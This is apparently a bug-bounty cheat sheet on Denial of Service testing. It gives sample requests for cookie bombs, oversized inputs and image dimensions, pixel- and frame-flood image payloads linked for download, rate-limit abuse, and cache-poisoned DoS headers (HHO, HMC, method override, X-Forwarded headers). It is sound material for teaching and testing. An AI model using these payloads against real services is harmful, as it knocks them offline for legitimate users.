# Denial of Service

## Introduction
Denial of Service is a type of attack on a service that disrupts its normal function and prevents other users from accessing it

## Where to find
This vulnerability can appear in all features of the application. Depending on how to exploit it, for example in the file upload feature, you can upload very large files

## How to exploit
1. Cookie bomb
   
```
https://target.com/index.php?param1=xxxxxxxxxxxxxx
```
After input "xxxxxxxxxxxxxx" as a value of param1, check your cookies. If there is cookies the value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable

2. Try input a very long payload to form. For example using very long password or using very long email
```
POST /register HTTP/1.1
Host: target.com
...

username=victim&password=aaaaaaaaaaaaaaa
```

3. Pixel flood, using image with a huge pixels

Download the payload: [Here](https://daffa.tech/lottapixel3.jpg)

4. Frame flood, using GIF with a huge frame

Download the payload: [Here](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/000/136/902000ac102f14a36a4d83ed9b5c293017b77fc7/uber.gif?response-content-disposition=attachment%3B%20filename%3D%22uber.gif%22%3B%20filename%2A%3DUTF-8%27%27uber.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ245MJJPA%2F20200910%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200910T110848Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFMaCXVzLXdlc3QtMiJHMEUCIEC768ifpRHeEUucuNuVL%2FdcSsWMnGeNp%2FMhKs6afB01AiEAiZOP%2FwMaeQMITUni3aFcACIOqOHnWHgLKuXHRrb5LooqtAMIXBABGgwwMTM2MTkyNzQ4NDkiDHHy9PJ2ccl9cmsvyCqRA6bliBHBMPXR6NYflM%2BCXCCQ5VLdPCATpmLs9DhVuYsjxR3JUtVHnBvtfEYYWDWWsLoC3xuzmug5ycrAvqK%2BTYDYO7l4HD1rXfyEBkR579ZlUFab6bOL4i8nDqblun%2FeV253Sgd6GzL4E%2FXmUN%2FC6qNydSd9hp2fLoyNjqob6o5zJjmnqvZsq50ROOZwf1idkDtr163qeVZERnan7aY9rM%2FsX4iVdE4wY0rLw1maGRuDF2aLVCxPB681htsHt%2FpoZ18QY7LjcbNjbjB4PgXLd1sm5zQ4q9mPVxTZPvzo9BJCh7l6kMLHCtJXOXfrvvN8UBgIqr1KXvodzv7FRQYcvEpfw4pwCTWzBs8VeEcwS9gjOXFMNLNI8SZ9V76VQ5KrOIpKhzM9UQQN3DVzY3SwMHydX%2B%2BYcQTt%2FjvqTkorsltqob2g5E1K0U8btRLBvBqOo0Vbr75zLcLUUomDBQzSNSvJgTN43huYmkZxBpWAAId72Tt6m56aFQLXkCKGSoMxYjrrVW9jc37pVl3lZU7FIX0AMIuN6PoFOusBpDCrjFwR1Y7t7W8wLapYjI6yOkkvWTFwWvx38jZl9okqo5xchKolmKxKX7cfGPIyuUmSXc1xa0nKwYeOYlhQZfyI0NobqyWW81ITuuUjsBxULuqrXqfVl0PTjTTpqe%2FHvU6wYSE358XfggtcqaH9PPgNDOejgv%2FLnh9AH9nyqIWuaCu865IfAOupVVzFzQilyB2LDyQtTS4Kp5dHyEAibRQlqeKHWOkUE2mQefAaTxKLRKrs0mJQYSuC%2B4LQEB3Cq9Nhj5HN%2BYT7A7CDLrvyChyfYXQZYr0lR1jN91Yd7SBe2jB1Qls%2Bx%2FEUlQ%3D%3D&X-Amz-Signature=910a3812cf3b69f6fa72f39a89a6df2f395f8d17ef8702eeb164a0477c64fff5)

5. Sometimes in website we found a parameter that can adjust the size of the image, for example
```
https://target.com/img/vulnerable.jpg?width=500&height=500
```
Try change "500" to "99999999999"
```
https://target.com/img/vulnerable.jpg?width=99999999999&height=99999999999
```

6. Try changing the value of the header with something new, for example:
```
Accept-Encoding: gzip, gzip, deflate, br, br
```

7. Sometimes if you try bug "No rate limit", after a long try it. The server will go down because there is so much requests

8. ReDoS (Regex DoS) occurs due to poorly implemented RegEx

9. CPDoS ([Cache Poisoned Denial of Service](https://cpdos.org/))
- HTTP Header Oversize (HHO)
  
  A malicious client sends an HTTP GET request including a header larger than the size supported by the origin server but smaller than the size supported by the cache
  ```
  GET /index.html HTTP/1.1
  Host: victim.com
  X-Oversized-Header-1: Big_Value
  ...

  ```
  The response is
  ```
  HTTP/1.1 400 Bad Request
  ...

  Header size exceeded
  ```
- HTTP Meta Character (HMC)
  
  this attack tries to bypass a cache with a request header containing a harmful meta character. Meta characters can be, e.g., control characters such as line break/carriage return (\n), line feed (\r) or bell (\a).

  ```
  GET /index.html HTTP /1.1
  Host: victim.com
  X-Meta-Malicious-Header: \r\n
  ...
  ```
  The response is
  ```
  HTTP/1.1 400 Bad Request
  ...

  Character not allowed
  ```
- HTTP Method Override (HMO)

  There are several headers present in HTTP Standard that allow modifying overriding the original HTTP header. Some of these headers are:
  ```
  1. X-HTTP-Method-Override
  2. X-HTTP-Method
  3. X-Method-Override
  ```
  The header instructs the application to override the HTTP method in request.
  ```
  GET /index.php HTTP/1.1
  Host: victim.com
  X-HTTP-Method-Override: POST
  ...
  ```
  The response is
  ```
  HTTP/1.1 404 Not Found
  ...

  POST on /index.php not found
  ```

- X-Forwarded-Port
  ```
  GET /index.php?dontpoisoneveryone=1 HTTP/1.1
  Host: www.hackerone.com
  X-Forwarded-Port: 123
  ...
  ```

- X-Forwarded-Host
  ```
  GET /index.php?dontpoisoneveryone=1 HTTP/1.1
  Host: www.hackerone.com
  X-Forwarded-Host: www.hackerone.com:123
  ...
  ```
  
![Response DoS](https://portswigger.net/cms/images/6f/83/45a1a9f841b9-article-screen_shot_2018-09-13_at_11.08.12.png)

## References
- [Hackerone #840598](https://hackerone.com/reports/840598)
- [Hackerone #105363](https://hackerone.com/reports/105363)
- [Hackerone #390](https://hackerone.com/reports/390)
- [Hackerone #400](https://hackerone.com/reports/400)
- [Hackerone #751904](https://hackerone.com/reports/751904)
- [Hackerone #861170](https://hackerone.com/reports/861170)
- [Hackerone #892615](https://hackerone.com/reports/892615)
- [Hackerone #511381](https://hackerone.com/reports/511381)
- [Hackerone #409370](https://hackerone.com/reports/409370)
- [CPDoS](https://cpdos.org/)